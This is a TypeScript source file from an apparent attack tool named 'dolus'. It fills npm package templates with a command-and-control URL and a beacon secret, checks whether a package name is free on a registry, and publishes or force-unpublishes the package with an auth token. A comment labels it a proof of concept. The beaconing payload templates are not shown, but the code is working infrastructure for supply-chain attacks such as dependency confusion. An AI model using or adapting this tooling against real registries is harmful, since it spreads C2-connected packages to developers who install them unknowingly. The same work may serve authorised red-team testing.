import { spawnSync } from 'child_process';
import fs from 'fs';
import path from 'path';
import os from 'os';
import crypto from 'crypto';
import http from 'http';
import https from 'https';

// dolus/server/../packages/template
const TEMPLATE_DIR = path.join(process.cwd(), '..', 'packages', 'template');
const TEMPLATE_FILES = ['package.json', 'index.js', 'extension.js'];

export function renderTemplate(content: string, pkgName: string, c2Url: string, beaconSecret = ''): string {
  return content
    .replaceAll('__PKG_NAME__', pkgName)
    .replaceAll('__C2_URL__', c2Url)
    .replaceAll('__BEACON_SECRET__', beaconSecret);
}

export function packageExistsOnRegistry(pkgName: string, registryUrl: string): Promise<boolean> {
  const base = registryUrl.endsWith('/') ? registryUrl : registryUrl + '/';
  const url = new URL(pkgName, base);
  const mod = url.protocol === 'https:' ? https : http;
  return new Promise((resolve, reject) => {
    const req = mod.request(url, { method: 'HEAD' }, res => {
      if (res.statusCode === 200) resolve(true);
      else if (res.statusCode === 404) resolve(false);
      else reject(new Error(`registry returned ${res.statusCode}`));
    });
    req.on('error', reject);
    req.end();
  });
}

export function publishPackage(
  pkgName: string,
  registryUrl: string,
  token: string | null,
  c2Url: string,
  installJs?: string,
  beaconSecret = '',
): { success: boolean; output: string } {
  const tmpDir = path.join(os.tmpdir(), `dolus-${crypto.randomUUID()}`);
  fs.mkdirSync(tmpDir, { recursive: true });

  try {
    for (const file of TEMPLATE_FILES) {
      const raw = file === 'index.js' && installJs != null
        ? installJs
        : fs.readFileSync(path.join(TEMPLATE_DIR, file), 'utf8');
      fs.writeFileSync(path.join(tmpDir, file), renderTemplate(raw, pkgName, c2Url, beaconSecret));
    }

    if (token) {
      const host = new URL(registryUrl).host;
      fs.writeFileSync(path.join(tmpDir, '.npmrc'), `//${host}/:_authToken=${token}\n`);
    }

    // ponytail: spawnSync blocks event loop during publish (~2-5s), fine for PoC
    const result = spawnSync('npm', ['publish', '--registry', registryUrl], {
      cwd: tmpDir,
      encoding: 'utf8',
    });
    return {
      success: result.status === 0,
      output: ((result.stdout || '') + (result.stderr || '')).trim(),
    };
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

export function unpublishPackage(
  pkgName: string,
  registryUrl: string,
  token: string | null,
): { success: boolean; output: string } {
  const tmpDir = path.join(os.tmpdir(), `dolus-unpub-${crypto.randomUUID()}`);
  fs.mkdirSync(tmpDir, { recursive: true });
  try {
    if (token) {
      const host = new URL(registryUrl).host;
      fs.writeFileSync(path.join(tmpDir, '.npmrc'), `//${host}/:_authToken=${token}\n`);
    }
    const result = spawnSync('npm', ['unpublish', pkgName, '--force', '--registry', registryUrl], {
      cwd: tmpDir,
      encoding: 'utf8',
    });
    return {
      success: result.status === 0,
      output: ((result.stdout || '') + (result.stderr || '')).trim(),
    };
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}
